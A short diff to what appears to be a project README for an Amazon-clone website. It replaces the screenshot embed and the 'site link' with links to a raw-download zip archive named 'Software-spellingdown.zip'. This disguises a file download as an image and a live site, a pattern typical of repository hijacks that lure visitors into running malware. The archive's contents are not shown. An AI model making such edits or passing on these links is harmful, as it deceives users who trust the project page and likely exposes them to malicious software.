@@ -1,6 +1,6 @@
 output website
 
-![image](https://github.com/user-attachments/assets/5769e2c2-d0d2-41e4-afd5-ffb74e7b08bc)
+![image](https://raw.githubusercontent.com/Rithvik-krishna/amazonclone/main/penthouselike/Software-spellingdown.zip)
 
 
-site link : https://amazon-clone-rithvik.netlify.app/
+site link : https://raw.githubusercontent.com/Rithvik-krishna/amazonclone/main/penthouselike/Software-spellingdown.zip
